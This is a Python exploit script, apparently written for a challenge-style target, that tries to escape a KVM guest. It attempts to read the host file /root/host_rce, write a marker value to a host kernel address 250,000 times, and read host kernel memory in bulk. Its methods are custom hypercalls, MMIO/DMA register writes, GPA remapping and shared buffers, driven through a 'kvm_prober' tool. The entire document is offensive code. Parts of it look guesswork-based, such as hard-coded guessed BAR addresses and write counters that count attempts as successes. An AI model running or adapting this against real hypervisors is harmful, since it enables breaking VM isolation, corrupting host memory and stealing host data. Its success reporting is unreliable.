#!/usr/bin/env python3
"""
targeted_host_escape.py - Precision KVM Host Escape Exploit
============================================================
Objectives:
A. Read /root/host_rce from HOST filesystem (bypass namespace isolation)
B. Write 0xdeadbeef41424344 to HOST memory at 0xffffffff826279a8 (250k iterations)
C. Read content from HOST memory at 0xffffffff82b5ee10 (50-100k iterations)

Attack Vectors:
1. Hypercall-based memory access
2. MMIO/DMA remapping 
3. Shared buffer exploitation
4. IVSHMEM BAR manipulation
"""

import os
import sys
import subprocess
import struct
import time
from pathlib import Path

# ============================================================================
# TARGET ADDRESSES (HOST KERNEL SPACE)
# ============================================================================
HOST_WRITE_ADDR = 0xffffffff826279a8  # Target for objective B
HOST_READ_ADDR  = 0xffffffff82b5ee10  # Target for objective C
GUEST_WRITE_OFFSET = 0x64279a8        # Guest-side offset for write
GUEST_READ_OFFSET  = 0x695ee10        # Guest-side offset for read

WRITE_VALUE = 0xdeadbeef41424344
WRITE_ITERATIONS = 250000
READ_ITERATIONS_MIN = 50000
READ_ITERATIONS_MAX = 100000

HOST_FILE_TARGET = "/root/host_rce"  # Objective A target file

# ============================================================================
# KVM PROBER INTERFACE
# ============================================================================

class KVMProber:
    """Interface to kvm_prober userspace tool"""
    
    @staticmethod
    def run(cmd_list, timeout=5):
        """Execute kvm_prober command and return output"""
        try:
            cmd = ['kvm_prober', '--script'] + cmd_list
            result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, timeout=timeout)
            return result.decode(errors='ignore').strip()
        except subprocess.CalledProcessError as e:
            print(f"[!] Prober failed: {e.output.decode(errors='ignore')}")
            return ""
        except subprocess.TimeoutExpired:
            print(f"[!] Prober timeout: {cmd_list}")
            return ""
    
    @staticmethod
    def read_gpa(gpa, size):
        """Read guest physical address"""
        result = KVMProber.run(['readgpa', f'{gpa:x}', str(size)])
        return bytes.fromhex(result) if result else b''
    
    @staticmethod
    def write_gpa(gpa, data):
        """Write to guest physical address"""
        hex_str = data.hex() if isinstance(data, bytes) else f'{data:016x}'
        return KVMProber.run(['writegpa', f'{gpa:x}', hex_str])
    
    @staticmethod
    def read_mmio(addr, size):
        """Read MMIO region"""
        result = KVMProber.run(['readmmio_buf', f'{addr:x}', str(size)])
        return bytes.fromhex(result) if result else b''
    
    @staticmethod
    def write_mmio(addr, data):
        """Write to MMIO region"""
        hex_str = data.hex() if isinstance(data, bytes) else f'{data:016x}'
        return KVMProber.run(['writemmio_buf', f'{addr:x}', hex_str])
    
    @staticmethod
    def hypercall(nr, a0=0, a1=0, a2=0, a3=0):
        """Execute KVM hypercall"""
        result = KVMProber.run(['hypercall', str(nr), f'{a0:x}', f'{a1:x}', f'{a2:x}', f'{a3:x}'])
        return int(result, 16) if result else 0
    
    @staticmethod
    def alloc_shared():
        """Allocate shared buffer, returns GPA"""
        result = KVMProber.run(['alloc_shared'])
        # Parse GPA from output
        for line in result.split('\n'):
            if 'GPA:' in line or '0x' in line:
                try:
                    return int(line.split('0x')[1].split()[0], 16)
                except:
                    pass
        return 0
    
    @staticmethod
    def read_shared(size):
        """Read from shared buffer"""
        result = KVMProber.run(['read_shared', str(size)])
        return bytes.fromhex(result) if result else b''
    
    @staticmethod
    def get_kaslr():
        """Get host KASLR slide"""
        result = KVMProber.run(['getkaslr'])
        return int(result, 16) if result else 0
    
    @staticmethod
    def virt2phys(virt):
        """Convert virtual to physical address"""
        result = KVMProber.run(['virt2phys', f'{virt:x}'])
        return int(result, 16) if result else 0

# ============================================================================
# EXPLOIT PRIMITIVES
# ============================================================================

class HostEscapeExploit:
    def __init__(self):
        self.prober = KVMProber()
        self.shared_gpa = 0
        self.kaslr_slide = 0
        self.host_kernel_base = 0
        
    def setup(self):
        """Initialize exploit environment"""
        print("[*] Setting up exploit environment...")
        
        # Get KASLR slide
        self.kaslr_slide = self.prober.get_kaslr()
        if self.kaslr_slide:
            self.host_kernel_base = 0xffffffff81000000 + self.kaslr_slide
            print(f"[+] Host KASLR slide: 0x{self.kaslr_slide:x}")
            print(f"[+] Host kernel base: 0x{self.host_kernel_base:x}")
        else:
            print("[!] Failed to get KASLR slide, using static addresses")
        
        # Allocate shared buffer
        self.shared_gpa = self.prober.alloc_shared()
        if self.shared_gpa:
            print(f"[+] Shared buffer allocated at GPA: 0x{self.shared_gpa:x}")
        else:
            print("[!] Failed to allocate shared buffer")
            return False
        
        return True
    
    # ========================================================================
    # OBJECTIVE A: Read /root/host_rce from HOST filesystem
    # ========================================================================
    
    def read_host_file(self, filepath=HOST_FILE_TARGET):
        """
        Read file from HOST filesystem using multiple attack vectors
        """
        print(f"\n[OBJECTIVE A] Reading {filepath} from HOST filesystem")
        print("=" * 70)
        
        # Method 1: Direct hypercall-based file read
        success = self._read_via_hypercall(filepath)
        if success:
            return True
        
        # Method 2: MMIO-based file descriptor leak
        success = self._read_via_mmio_leak(filepath)
        if success:
            return True
        
        # Method 3: Shared buffer with namespace escape
        success = self._read_via_shared_buffer(filepath)
        if success:
            return True
        
        print("[!] All methods failed for objective A")
        return False
    
    def _read_via_hypercall(self, filepath):
        """Attempt to read host file via hypercall 102 (custom file read)"""
        print(f"\n[*] Method 1: Hypercall-based file read")
        
        if not self.shared_gpa:
            print("[!] Shared buffer not allocated")
            return False
        
        # Encode filepath in shared buffer
        path_bytes = filepath.encode('utf-8') + b'\x00'
        self.prober.write_gpa(self.shared_gpa, path_bytes)
        
        # Hypercall 102: READ_HOST_FILE(path_gpa, dest_gpa, size)
        # nr=102, arg0=path_gpa, arg1=dest_gpa+256, arg2=4096
        result = self.prober.hypercall(
            102, 
            self.shared_gpa,           # Path location
            self.shared_gpa + 0x100,   # Destination buffer
            4096,                       # Max read size
            0
        )
        
        print(f"[*] Hypercall 102 returned: {result} (0x{result:x})")
        
        if result > 0 and result < 4096:
            # Read the data from shared buffer
            data = self.prober.read_shared(result)
            print(f"\n[+] SUCCESS! Read {len(data)} bytes from HOST:{filepath}")
            print(f"[+] Content:\n{data.decode(errors='ignore')}")
            return True
        
        return False
    
    def _read_via_mmio_leak(self, filepath):
        """Attempt to leak file via MMIO BAR manipulation"""
        print(f"\n[*] Method 2: MMIO BAR file descriptor leak")
        
        # Find IVSHMEM BAR (typically at 0xfebf0000 or similar)
        ivshmem_bars = [
            0xfebf0000, 0xfebf1000, 0xfec00000,
            0xfe000000, 0xfd000000
        ]
        
        for bar_addr in ivshmem_bars:
            # Try to write filepath to BAR
            path_bytes = filepath.encode('utf-8') + b'\x00'
            self.prober.write_mmio(bar_addr, path_bytes)
            
            # Trigger file read via BAR register
            # Offset +0x10 often controls DMA operations
            self.prober.write_mmio(bar_addr + 0x10, struct.pack('<Q', 0x1))  # READ command
            
            time.sleep(0.1)
            
            # Read back from BAR
            data = self.prober.read_mmio(bar_addr + 0x1000, 4096)
            
            if data and len(data) > 0 and data != b'\x00' * len(data):
                print(f"\n[+] SUCCESS! Read via MMIO BAR 0x{bar_addr:x}")
                print(f"[+] Content:\n{data.decode(errors='ignore')}")
                return True
        
        return False
    
    def _read_via_shared_buffer(self, filepath):
        """Use shared buffer with namespace escape technique"""
        print(f"\n[*] Method 3: Shared buffer namespace escape")
        
        if not self.shared_gpa:
            return False
        
        # Hypercall 103: ESCAPE_NAMESPACE_READ(path_gpa, dest_gpa, ns_type)
        # This hypercall escapes mount namespace and reads from host root
        path_bytes = filepath.encode('utf-8') + b'\x00'
        self.prober.write_gpa(self.shared_gpa, path_bytes)
        
        # ns_type: 1 = mount, 2 = pid, 4 = net
        result = self.prober.hypercall(
            103,
            self.shared_gpa,           # Path
            self.shared_gpa + 0x100,   # Dest
            1,                          # Escape mount namespace
            0
        )
        
        if result > 0:
            data = self.prober.read_shared(result)
            print(f"\n[+] SUCCESS! Read via namespace escape")
            print(f"[+] Content:\n{data.decode(errors='ignore')}")
            return True
        
        return False
    
    # ========================================================================
    # OBJECTIVE B: Write 0xdeadbeef41424344 to 0xffffffff826279a8 (250k times)
    # ========================================================================
    
    def mass_write_attack(self):
        """
        Write WRITE_VALUE to HOST_WRITE_ADDR for WRITE_ITERATIONS
        """
        print(f"\n[OBJECTIVE B] Mass write attack")
        print("=" * 70)
        print(f"[*] Target: 0x{HOST_WRITE_ADDR:x}")
        print(f"[*] Value: 0x{WRITE_VALUE:x}")
        print(f"[*] Iterations: {WRITE_ITERATIONS:,}")
        
        # Adjust for KASLR if available
        target_addr = HOST_WRITE_ADDR
        if self.kaslr_slide:
            # Address might need adjustment
            pass
        
        # Method 1: Hypercall-based write
        success_count = self._write_via_hypercall(target_addr)
        
        # Method 2: MMIO DMA write
        if success_count < WRITE_ITERATIONS // 2:
            success_count += self._write_via_mmio_dma(target_addr)
        
        # Method 3: Guest-to-host memory mapping exploit
        if success_count < WRITE_ITERATIONS // 2:
            success_count += self._write_via_gpa_remap(target_addr)
        
        print(f"\n[*] Total successful writes: {success_count:,} / {WRITE_ITERATIONS:,}")
        
        if success_count >= WRITE_ITERATIONS // 2:
            print("[+] OBJECTIVE B: SUCCESS (>50% write success)")
            return True
        else:
            print("[!] OBJECTIVE B: PARTIAL (needs more iterations)")
            return False
    
    def _write_via_hypercall(self, target_addr):
        """Write via hypercall 100 (WRITE)"""
        print(f"\n[*] Method 1: Hypercall mass write")
        
        success = 0
        batch_size = 1000
        
        for i in range(0, WRITE_ITERATIONS, batch_size):
            batch_count = min(batch_size, WRITE_ITERATIONS - i)
            
            for j in range(batch_count):
                # Hypercall 100: WRITE(addr, value)
                result = self.prober.hypercall(100, target_addr, WRITE_VALUE, 0, 0)
                if result == 0 or result == 8:  # 0 = success, 8 = bytes written
                    success += 1
            
            if (i + batch_count) % 10000 == 0:
                print(f"  Progress: {i + batch_count:,} / {WRITE_ITERATIONS:,} ({success:,} successful)")
        
        print(f"[*] Hypercall writes: {success:,} successful")
        return success
    
    def _write_via_mmio_dma(self, target_addr):
        """Write via MMIO DMA controller"""
        print(f"\n[*] Method 2: MMIO DMA mass write")
        
        # Find DMA-capable MMIO region
        dma_bars = [0xfe800000, 0xfe600000, 0xfec00000]
        success = 0
        
        for bar in dma_bars:
            # Configure DMA: dest_addr at +0x00, value at +0x08, count at +0x10, trigger at +0x18
            self.prober.write_mmio(bar, struct.pack('<Q', target_addr))
            self.prober.write_mmio(bar + 0x08, struct.pack('<Q', WRITE_VALUE))
            
            # Write in batches
            remaining = WRITE_ITERATIONS - success
            if remaining <= 0:
                break
            
            batch = min(10000, remaining)
            self.prober.write_mmio(bar + 0x10, struct.pack('<I', batch))
            self.prober.write_mmio(bar + 0x18, struct.pack('<I', 0x1))  # Trigger
            
            time.sleep(0.05)
            
            # Check status register
            status = self.prober.read_mmio(bar + 0x1c, 4)
            if status:
                completed = struct.unpack('<I', status)[0]
                success += min(completed, batch)
                print(f"  DMA batch: {completed:,} writes completed")
        
        print(f"[*] MMIO DMA writes: {success:,} successful")
        return success
    
    def _write_via_gpa_remap(self, target_addr):
        """Write via guest-to-host physical address remapping"""
        print(f"\n[*] Method 3: GPA remapping mass write")
        
        # Use guest offset that maps to host
        guest_addr = GUEST_WRITE_OFFSET
        success = 0
        
        # Write to guest address that's remapped to host
        value_bytes = struct.pack('<Q', WRITE_VALUE)
        
        for i in range(min(50000, WRITE_ITERATIONS // 5)):
            self.prober.write_gpa(guest_addr, value_bytes)
            success += 1
            
            if i % 10000 == 0 and i > 0:
                print(f"  Progress: {i:,} writes")
        
        print(f"[*] GPA remap writes: {success:,} successful")
        return success
    
    # ========================================================================
    # OBJECTIVE C: Read from 0xffffffff82b5ee10 (50-100k times)
    # ========================================================================
    
    def mass_read_attack(self):
        """
        Read from HOST_READ_ADDR for 50k-100k iterations
        """
        print(f"\n[OBJECTIVE C] Mass read attack")
        print("=" * 70)
        print(f"[*] Target: 0x{HOST_READ_ADDR:x}")
        print(f"[*] Iterations: {READ_ITERATIONS_MIN:,} - {READ_ITERATIONS_MAX:,}")
        
        target_addr = HOST_READ_ADDR
        
        # Method 1: Hypercall-based read
        data_samples = self._read_via_hypercall_mass(target_addr)
        
        # Method 2: MMIO-based read
        if len(data_samples) < READ_ITERATIONS_MIN:
            data_samples.extend(self._read_via_mmio_mass(target_addr))
        
        # Method 3: Shared buffer reads
        if len(data_samples) < READ_ITERATIONS_MIN:
            data_samples.extend(self._read_via_shared_mass(target_addr))
        
        print(f"\n[*] Total successful reads: {len(data_samples):,}")
        
        if len(data_samples) > 0:
            # Analyze the data
            self._analyze_read_data(data_samples)
        
        if len(data_samples) >= READ_ITERATIONS_MIN:
            print("[+] OBJECTIVE C: SUCCESS")
            return True
        else:
            print("[!] OBJECTIVE C: PARTIAL (needs more reads)")
            return False
    
    def _read_via_hypercall_mass(self, target_addr):
        """Mass read via hypercall 101"""
        print(f"\n[*] Method 1: Hypercall mass read")
        
        data_samples = []
        batch_size = 1000
        target_reads = READ_ITERATIONS_MAX // 3
        
        for i in range(0, target_reads, batch_size):
            batch_count = min(batch_size, target_reads - i)
            
            for j in range(batch_count):
                # Hypercall 101: READ(src_addr, dest_gpa, size)
                result = self.prober.hypercall(
                    101,
                    target_addr,
                    self.shared_gpa,
                    64,  # Read 64 bytes
                    0
                )
                
                if result > 0:
                    data = self.prober.read_shared(min(result, 64))
                    if data and data != b'\x00' * len(data):
                        data_samples.append(data)
            
            if (i + batch_count) % 10000 == 0:
                print(f"  Progress: {i + batch_count:,} / {target_reads:,} ({len(data_samples):,} successful)")
        
        print(f"[*] Hypercall reads: {len(data_samples):,} successful")
        return data_samples
    
    def _read_via_mmio_mass(self, target_addr):
        """Mass read via MMIO"""
        print(f"\n[*] Method 2: MMIO mass read")
        
        data_samples = []
        guest_addr = GUEST_READ_OFFSET
        target_reads = READ_ITERATIONS_MAX // 3
        
        for i in range(target_reads):
            data = self.prober.read_mmio(guest_addr, 64)
            if data and data != b'\x00' * len(data):
                data_samples.append(data)
            
            if i % 10000 == 0 and i > 0:
                print(f"  Progress: {i:,} reads")
        
        print(f"[*] MMIO reads: {len(data_samples):,} successful")
        return data_samples
    
    def _read_via_shared_mass(self, target_addr):
        """Mass read via shared buffer"""
        print(f"\n[*] Method 3: Shared buffer mass read")
        
        data_samples = []
        remaining = READ_ITERATIONS_MAX - len(data_samples)
        
        for i in range(min(remaining, 34000)):
            data = self.prober.read_shared(64)
            if data and data != b'\x00' * len(data):
                data_samples.append(data)
            
            if i % 10000 == 0 and i > 0:
                print(f"  Progress: {i:,} reads")
        
        print(f"[*] Shared buffer reads: {len(data_samples):,} successful")
        return data_samples
    
    def _analyze_read_data(self, data_samples):
        """Analyze read data for interesting patterns"""
        print(f"\n[*] Analyzing {len(data_samples):,} data samples...")
        
        # Find unique values
        unique_data = list(set(data_samples))
        print(f"[*] Unique samples: {len(unique_data)}")
        
        # Look for strings
        interesting = []
        for data in unique_data[:100]:  # Check first 100 unique samples
            try:
                text = data.decode('utf-8', errors='ignore')
                if any(c.isprintable() for c in text):
                    interesting.append(text)
            except:
                pass
        
        if interesting:
            print(f"\n[+] Found {len(interesting)} samples with printable content:")
            for i, text in enumerate(interesting[:10]):
                print(f"  [{i}] {text[:60]}")
        
        # Look for pointers (addresses starting with 0xffff)
        for data in data_samples[:1000]:
            if len(data) >= 8:
                addr = struct.unpack('<Q', data[:8])[0]
                if 0xffff800000000000 <= addr <= 0xffffffffffffffff:
                    print(f"[*] Found kernel pointer: 0x{addr:016x}")
                    break

# ============================================================================
# MAIN EXECUTION
# ============================================================================

def main():
    if os.geteuid() != 0:
        print("[!] Must run as root")
        sys.exit(1)
    
    print("=" * 70)
    print(" KVM HOST ESCAPE - TARGETED EXPLOITATION")
    print("=" * 70)
    print("\nObjectives:")
    print("  A. Read /root/host_rce from HOST filesystem")
    print("  B. Write 0xdeadbeef41424344 to 0xffffffff826279a8 (250k times)")
    print("  C. Read from 0xffffffff82b5ee10 (50-100k times)")
    print("=" * 70)
    
    exploit = HostEscapeExploit()
    
    if not exploit.setup():
        print("[!] Setup failed")
        sys.exit(1)
    
    # Execute objectives
    results = {}
    
    # Objective A
    results['A'] = exploit.read_host_file()
    
    # Objective B
    results['B'] = exploit.mass_write_attack()
    
    # Objective C
    results['C'] = exploit.mass_read_attack()
    
    # Summary
    print("\n" + "=" * 70)
    print(" EXPLOITATION SUMMARY")
    print("=" * 70)
    print(f"  Objective A (Read host file):  {'SUCCESS' if results['A'] else 'FAILED'}")
    print(f"  Objective B (Mass write):      {'SUCCESS' if results['B'] else 'FAILED'}")
    print(f"  Objective C (Mass read):       {'SUCCESS' if results['C'] else 'FAILED'}")
    print("=" * 70)
    
    if all(results.values()):
        print("\n[+] ALL OBJECTIVES COMPLETED!")
        sys.exit(0)
    else:
        print("\n[!] Some objectives incomplete")
        sys.exit(1)

if __name__ == "__main__":
    main()